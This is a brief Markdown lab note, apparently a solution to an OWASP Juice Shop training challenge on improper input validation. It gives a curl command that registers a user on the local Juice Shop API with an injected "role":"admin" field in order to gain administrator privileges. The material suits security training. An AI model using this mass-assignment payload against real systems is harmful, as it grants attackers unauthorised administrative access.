# Improper Input Validation

## Admin Registration

Register as a user with administrator privileges

```bash
# register a user > inspect the response > add to the payload`"role":"admin"`
curl -sS http://juiceshop:3000/api/Users/ -H 'Content-Type: application/json' --data-raw $'{"email":"a@a.com","password":"12345","passwordRepeat":"12345","securityQuestion":{"id":3,"question":"Mother\'s birth date? (MM/DD/YY)","createdAt":"2023-11-07T08:41:38.130Z","updatedAt":"2023-11-07T08:41:38.130Z"},"securityAnswer":"000000","role":"admin"}' | jq
```
